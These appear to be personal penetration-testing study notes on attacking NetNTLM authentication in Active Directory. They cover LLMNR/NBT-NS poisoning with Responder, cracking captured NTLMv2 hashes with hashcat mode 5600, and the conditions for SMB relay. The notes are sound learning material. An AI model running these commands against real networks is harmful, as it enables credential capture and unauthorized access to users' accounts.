# NetNTLM

{% embed url="https://jarrettgxz-sec.gitbook.io/windows/active-directory-ad/authentication-methods/netntlm" %}

NetNTLM challenges can be intercepted using a Man-in-the-Middle (MitM) attack, where it can be cracked to retrieve the password of a particular user. Particularly, a few name resolution protocols have flaws in the way they are implemented that allows for such attacks to happen. The protocols are as listed:

1. Link-Local Multicast Name Resolution (LLMNR)
   * utilizes a multicast approach to send query to all devices in the **multicast group**
2. NetBIOS Name Service (NBT-NS)
   * utilizes a broadcast approach to send query to all devices in the **entire subnet**
3. Web Proxy Auto-Discovery (WPAD)&#x20;
   * ...

### Server Message Block (SMB)

The SMB protocol uses the NetNTLM authentication method, which can be exploited due to the name resolution protocols in place.

The [Responder](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/windows-active-directory/tools/responder) tool can be used to automatically watch the network, and intercept any name resolution queries, before quickly sending a response packet to the source, while acting as the intended recipient - essentially a race condition situation to see if the spoofed or legitimate response will reach first.

This will trick the server to communicate with the rogue server (running Responder tool) instead of the legitimate device.

### Exploit methods for the NetNTLM authentication

#### 1. Intercept and crack the NetNTLM challenge

The rogue device will first start a listener to intercept the NTLM challenge:

```sh
$ responder -I <iface>
```

After retrieving the hash, we can proceed to crack it using hashcat:

```sh
$ hashcat -m 5600 <hash_file> <password_file> --force
```

* `-m 5600`: NetNNTLMv2 (Copy paste directly in browser to maintain fragment: [https://hashcat.net/wiki/doku.php?id=hashcat#:\~:text=5600](https://hashcat.net/wiki/doku.php?id=hashcat))

**Example**

```sh
$ responder -I <iface>
...

[SMB] NTLMv2-SSP Client   : ...
[SMB] NTLMv2-SSP Username : xxx\username
[SMB] NTLMv2-SSP Hash     : username::xxx:<hash>

$ echo username::xxx:<hash> > ntlmv2-hash

$ hashcat -m 5600 ntlmv2-hash <password_file> --force
...
```

#### 2. Relaying the challenge

This method involves performing a Man-in-the-Middle style attack between a user and target server. However, this requires a few conditions to be met for the attack to be relevant:

a. SMB signing disabled

b. The associated user account needs the apprioprate persmissions on the server to access our desired resources - ideally administrative privileges

Thus, this attack is not usually used. The image shown below is taken directly from the TryHackMe's breaching AD room ([https://tryhackme.com/room/breachingad](https://tryhackme.com/room/breachingad)), and can be used to illustrate the overall relay attack flow:

<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>



